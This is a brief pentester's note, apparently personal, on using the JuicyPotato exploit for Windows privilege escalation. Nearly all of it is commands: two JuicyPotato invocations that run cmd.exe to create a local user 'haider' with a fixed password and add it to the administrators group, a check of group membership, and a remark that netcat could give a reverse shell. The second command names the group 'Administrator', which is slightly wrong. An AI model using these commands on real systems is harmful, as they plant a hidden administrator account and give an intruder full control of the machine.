**JUICYPOTATO**

![[Pasted image 20260404172233.png]]

```CMD
Juicypotato -t * -p C:\windows\system32\cmd.exe -a "/c net user haider password@123 /add" -l 1337
```

 ```cmd
 Juicypotato -t * -p C:\windows\system32\cmd.exe -a "/c net localgroup Administrator haider /add" -l 1337
 ```

**verify**

```cmd
net localgroup Administrators
```

**ENABLING A PATH TO GET A SHELL ITS NEW WAY**
*WE CAN GET A REVERSE SHELL , BUT IT NEED NETCAT OR SOME *